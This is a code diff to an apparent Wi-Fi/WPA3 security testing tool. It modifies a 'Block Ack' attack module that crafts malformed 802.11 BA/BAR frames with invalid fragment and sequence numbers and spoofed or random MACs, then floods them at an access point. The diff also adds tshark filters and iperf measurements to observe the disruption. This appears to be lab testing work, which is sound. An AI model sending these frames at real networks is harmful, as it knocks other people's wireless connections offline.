@@ -39,8 +39,9 @@ namespace wpa3_tester::bl0ck_attack{
 
     RadioTap get_BA_frame(const HWAddress<6> &ap_hw, const HWAddress<6> &sta_hw){
         Dot11BlockAck ba(ap_hw, sta_hw); // STA(attacker) -> AP
-        ba.fragment_number(4);
-        ba.start_sequence(1175);
+        ba.fragment_number(4); // invalid FN
+        ba.start_sequence(1175); // random invalid SSN
+        ba.bar_control(0x0004);
         const vector<uint8_t> payload_data = {
             0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
             0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
@@ -145,6 +146,7 @@ namespace wpa3_tester::bl0ck_attack{
 
         RadioTap bars_frame;
         if (attack_type == "BARS") {
+            //TODO BARS dont work
             const HWAddress<6> sta_hw = is_random ? HWAddress<6>(iface::rand_mac()) : HWAddress<6>(STA_mac);
             bars_frame = get_BARS_frame(ap_hw, sta_hw, iface, 30);
             log(LogLevel::INFO, "BARS: Frame prepared with captured sequence number");
@@ -155,13 +157,10 @@ namespace wpa3_tester::bl0ck_attack{
             try {
                 const HWAddress<6> sta_hw = is_random ? HWAddress<6>(iface::rand_mac()) : HWAddress<6>(STA_mac);
                 RadioTap block_frame;
-                if (attack_type == "BAR") {
-                    block_frame = get_BAR_frame(ap_hw, sta_hw);
-                } else if (attack_type == "BA") {
-                    block_frame = get_BA_frame(ap_hw, sta_hw);
-                } else if (attack_type == "BARS") {
-                    block_frame = bars_frame;
-                }
+
+                if (attack_type == "BAR") {block_frame = get_BAR_frame(ap_hw, sta_hw);}
+                if (attack_type == "BA") {block_frame = get_BA_frame(ap_hw, sta_hw);}
+                if (attack_type == "BARS") {block_frame = bars_frame;}
 
                 log(LogLevel::DEBUG, "Sending batch %d", iteration);
                 for (int i = 0; i < frame_num; ++i) {sender.send(block_frame, iface_obj);}
@@ -175,7 +174,33 @@ namespace wpa3_tester::bl0ck_attack{
         log(LogLevel::INFO, "Block attack completed after %d iterations", iteration);
     }
 
-    void speed_observation_start(RunStatus &rs){
+    void iperf_conn(RunStatus &rs, const string& src_client,  const string&  dst_server){
+        observer::start_iperf3_server(rs,"iperf_server", dst_server);
+        rs.process_manager.wait_for("iperf_server","Server listening on ", seconds(30));
+        observer::start_iperf3(rs,"iperf_client", src_client, dst_server);
+    };
+
+    static string bpf_mac_at(const int offset, const string &mac) {
+        // BPF cant filter 6 bytes at one filters //TODO
+        // 4 byte: wlan[offset:4]
+        // 2 byte: wlan[offset+4:2]
+
+        unsigned int b[6];
+        sscanf(mac.c_str(), "%x:%x:%x:%x:%x:%x", &b[0],&b[1],&b[2],&b[3],&b[4],&b[5]);
+
+        char buf[128];
+        snprintf(buf, sizeof(buf),
+            "(wlan[%d:4] == 0x%02x%02x%02x%02x and wlan[%d:2] == 0x%02x%02x)",
+            offset,     b[0], b[1], b[2], b[3],
+            offset + 4, b[4], b[5]);
+        return string(buf);
+    }
+
+    static string bpf_mac_ra_or_ta(const string &mac) {
+        return "(" + bpf_mac_at(4, mac) + " or " + bpf_mac_at(10, mac) + ")";
+    }
+
+    void speed_observation_start(RunStatus &rs, const string& bl0ck_att_type){
         //observer::start_musezahn(rs, "mz_gen", "client", "access_point");
 
         const string c_mac = rs.get_actor("client")["mac"];
@@ -183,18 +208,25 @@ namespace wpa3_tester::bl0ck_attack{
         const string ap_mac = rs.get_actor("access_point")["mac"];
 
         const string mac_filter =
-    "(wlan host " + c_mac + " or wlan host " + a_mac + " or wlan host " + ap_mac + ")"
-    " or ((wlan[0] & 0xfc) == 0x84 or (wlan[0] & 0xfc) == 0x94)";
+        "((wlan host " + c_mac + " or wlan host " + a_mac + " or wlan host " + ap_mac + ")"
+        " and ((wlan[0] & 0xfc) == 0x88"    // QoS Data
+        " or (wlan[0] & 0xfc) == 0xd0))"   // Action (ADDBA)
+        // BAR/BA — MAC filters without offset
+        " or ((wlan[0] & 0xfc) == 0x84 and (" +
+        bpf_mac_ra_or_ta(c_mac) + " or " +
+        bpf_mac_ra_or_ta(a_mac) + " or " +
+        bpf_mac_ra_or_ta(ap_mac) + "))" +
+        " or ((wlan[0] & 0xfc) == 0x94 and (" +
+        bpf_mac_ra_or_ta(c_mac) + " or " +
+        bpf_mac_ra_or_ta(a_mac) + " or " +
+        bpf_mac_ra_or_ta(ap_mac) + "))";
 
         observer::start_tshark(rs, "attacker", mac_filter); //FIXME
-
-        //FIXME
         observer::start_tshark(rs, "client", mac_filter); //FIXME
-        //observer::start_thark(rs, "access_point", "udp port 5201");
+        //observer::start_tshark(rs, "access_point", mac_filter);
         this_thread::sleep_for(seconds(10));//FIXME wait for tshark
-        observer::start_iperf3_server(rs,"iperf_server", "access_point");
-        rs.process_manager.wait_for("iperf_server","Server listening on ", seconds(30));
-        observer::start_iperf3(rs,"iperf_client", "client",  "access_point");
+
+        iperf_conn(rs, "client",  "access_point");
     }
 
     void setup_attack(RunStatus& rs){
@@ -205,7 +237,7 @@ namespace wpa3_tester::bl0ck_attack{
 
         // -------- hostapd AP ------------
         hostapd::run_hostapd(rs, "access_point");
-        rs.process_manager.wait_for("access_point", "AP-ENABLED", seconds(10));
+        rs.process_manager.wait_for("access_point", "AP-ENABLED", seconds(20));
         log(LogLevel::INFO, "access_point is running");
         set_ip(rs, "access_point");
 
@@ -223,7 +255,6 @@ namespace wpa3_tester::bl0ck_attack{
     void run_bl0ck_attack(RunStatus& rs){
         const auto& att_cfg = rs.config.at("attack_config");
         const auto& attacker = rs.get_actor("attacker");
-
         const string iface   = attacker["iface"];
 
         const string STA_mac = rs.get_actor("client")["mac"];
@@ -234,7 +265,7 @@ namespace wpa3_tester::bl0ck_attack{
         const int frame_num = att_cfg.at("frame_number").get<int>();
         const bool is_random = att_cfg.at("random").get<bool>();
 
-        speed_observation_start(rs);
+        speed_observation_start(rs, bl0ck_att_type);
 
         log(LogLevel::INFO, "Block Attack START (Type: %s, Frames: %d)", bl0ck_att_type.c_str(), frame_num);
         this_thread::sleep_for(seconds(10));
@@ -251,14 +282,24 @@ namespace wpa3_tester::bl0ck_attack{
         events.push_back({get_time_logs(rs, "client", "@START"),"START","black"});
         events.push_back({get_time_logs(rs, "client", "@END"),"END","black"});
 
-        observer::tshark_graph(rs, "attacker", events);
+        events.push_back({
+            observer::get_tshark_events(rs, "attacker",
+                "wlan.fc.type_subtype == 0x000d", "ADDBA")
+            ,"ADDBA","blue"});
+        events.push_back({
+            observer::get_tshark_events(rs, "attacker",
+                "(wlan.fc.type_subtype == 0x0018) && (wlan.fixed.ssc.fragment == 4)","BA_fn4")
+            ,"BA_fn4","cyan"});
+        events.push_back({
+          observer::get_tshark_events(rs, "attacker",
+              "(wlan.fc.type_subtype == 0x0019) && (wlan.fixed.ssc.fragment == 4)","BA_fn4")
+          ,"BA_fn4","purple"});
 
-        // iperf graphs
-        events.push_back({get_time_logs(rs, "client", "CTRL-EVENT-STARTED-CHANNEL-SWITCH"),"SWITCH","blue"});
-        events.push_back({get_time_logs(rs, "client", "CTRL-EVENT-DISCONNECTED"),"DISCONN","red"});
+        observer::tshark_graph(rs, "attacker", events);
         observer::tshark_graph(rs, "client", events);
         //observer::tshark_graph(rs, "access_point", events);
 
+        // TODO iperf graphs
         log(LogLevel::INFO, "Bl0ck attack stop");
     }
 }
